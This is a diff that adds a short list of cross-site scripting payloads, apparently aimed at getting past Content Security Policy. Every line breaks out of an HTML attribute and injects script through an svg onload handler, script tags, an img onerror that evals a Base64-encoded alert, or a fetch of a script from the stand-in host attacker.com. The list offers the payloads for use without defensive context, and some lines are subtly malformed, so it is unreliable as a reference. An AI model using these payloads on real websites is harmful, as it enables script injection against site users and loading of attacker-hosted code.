@@ -1,0 +1,5 @@
+"><svg onload=alert(1)>
+"><script nonce-random123>alert(1)</script>
+"><script src='https://trusted.com/script.js'></script>
+"><img src=x onerror=eval(atob('YWxlcnQoMSk='))>  <!-- Base64 encoded alert(1) -->
+"><script>fetch('https://attacker.com/csp-bypass.js')</script>
